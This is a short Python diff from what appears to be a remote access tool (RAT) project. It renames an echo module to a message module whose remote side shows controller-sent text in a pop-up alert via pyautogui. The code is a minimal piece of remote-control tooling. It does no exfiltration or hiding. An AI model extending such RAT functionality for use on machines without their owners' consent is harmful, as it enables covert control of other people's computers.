@@ -1,9 +1,10 @@
 import struct
+import pyautogui
 
 from RATFunction.RATFunction import RATFunction
 
 
-class Echo(RATFunction):
+class Message(RATFunction):
 
     def __init__(self, side, packet_queue):
         super().__init__(side, packet_queue)
@@ -15,13 +16,11 @@ class Echo(RATFunction):
 
     def handle_packet_remote_side(self, data):
         packet_id, echo_str = struct.unpack("I 2044s", data)
-        echo_str = echo_str.decode()
-        print(echo_str)
-        return_packet = struct.pack("I 2044s", self.identifier(), echo_str.upper().encode())
-        self.packet_queue.put(return_packet)
+        echo_str = echo_str.decode().rstrip('\0')
+        pyautogui.alert(echo_str, 'Alert')
 
     def identifier(self) -> int:
         return 1
 
-    def send_echo(self, text):
+    def send_message(self, text):
         self.packet_queue.put(struct.pack("I 2044s", self.identifier(), text.encode()))
